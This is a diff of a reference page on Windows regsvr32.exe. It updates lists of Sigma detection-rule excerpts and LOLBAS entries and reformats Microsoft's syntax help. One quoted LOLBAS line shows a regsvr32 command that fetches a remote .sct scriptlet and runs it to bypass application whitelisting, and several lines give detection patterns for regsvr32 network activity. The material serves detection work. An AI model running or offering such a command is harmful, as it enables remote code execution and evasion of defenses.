@@ -8,6 +8,11 @@ title: regsvr32.exe | Microsoft(C) Register Server
 * Description: Microsoft(C) Register Server
 * Comments: 
 
+## Screenshot
+
+![regsvr32.exe](screenshots/regsvr32.exe-578BAB56836A3FE455FFC7883041825B.png)
+![regsvr32.exe](screenshots/regsvr32.exe-8CF9086BE38A15E905924B4A45D814D9-4.png)
+
 ## Hashes
 
 Type | Hash
@@ -62,6 +67,10 @@ Source | Source File | Example | License
 [sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `            - '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_creation_system_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_creation_system_file.yml) | `            - '*\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `            - '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml) | `title: Regsvr32 Network Activity` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml) | `description: Detects network connections and DNS queries initiated by Regsvr32.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml) | `    - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml) | `        Image\|endswith: '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_apt_bluemashroom.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_bluemashroom.yml) | `            - '*\regsvr32*\AppData\Local\\*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `            - '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_mmc_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml) | `            - '*\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
@@ -80,12 +89,6 @@ Source | Source File | Example | License
 [sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `        CommandLine: '*..\..\..\Windows\System32\regsvr32.exe *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_system_exe_anomaly.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_system_exe_anomaly.yml) | `            - '*\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_task_folder_evasion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_task_folder_evasion.yml) | `description: The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_creation_system_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_creation_system_file.yml) | `            - '*\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_regsvr32_network_activity.yml) | `title: Regsvr32 Network Activity` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_regsvr32_network_activity.yml) | `description: Detects network connections and DNS queries initiated by Regsvr32.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_regsvr32_network_activity.yml) | `    - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_regsvr32_network_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_regsvr32_network_activity.yml) | `        Image\|endswith: '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `            - '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\regsvr32.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `Name: Regsvr32.exe` | 
@@ -154,32 +157,29 @@ Source | Source File | Example | License
 
 ## regsvr32
 
-
-
 Registers .dll files as command components in the registry.
-
-
 
 ### Syntax
 
 ```
-regsvr32 [/u] [/s] [/n] [/i[:cmdline]] <DllName>
+regsvr32 [/u] [/s] [/n] [/i[:cmdline]] <Dllname>
 ```
 
 #### Parameters
 
-|Parameter|Description|
-|---------|-----------|
-|/u|Unregisters server.|
-|/s|Runs **Regsvr32** without displaying messages.|
-|/n|Runs **Regsvr32** without calling **DllRegisterServer**. (Requires the **/i** parameter.)|
-|/i:\<cmdline>|Passes an optional command-line string (*cmdline*) to **DllInstall**. If you use this parameter in conjunction with the **/u** parameter, it calls **DllUninstall**.|
-|\<DllName>|The name of the .dll file that will be registered.|
-|/?|Displays help at the command prompt.|
+| Parameter | Description |
+|--|--|
+| /u | Unregisters server. |
+| /s | Prevents displaying messages. |
+| /n | Prevents calling **DllRegisterServer**. This parameter requires you to also use the **/i** parameter. |
+| /i:`<cmdline>` | Passes an optional command-line string (*cmdline*) to **DllInstall**. If you use this parameter with the **/u** parameter, it calls **DllUninstall**. |
+| `<Dllname>` | The name of the .dll file that will be registered. |
+| /? | Displays help at the command prompt. |
 
-### Examples
+#### Examples
 
 To register the .dll for the Active Directory Schema, type:
+
 ```
 regsvr32 schmmgmt.dll
 ```
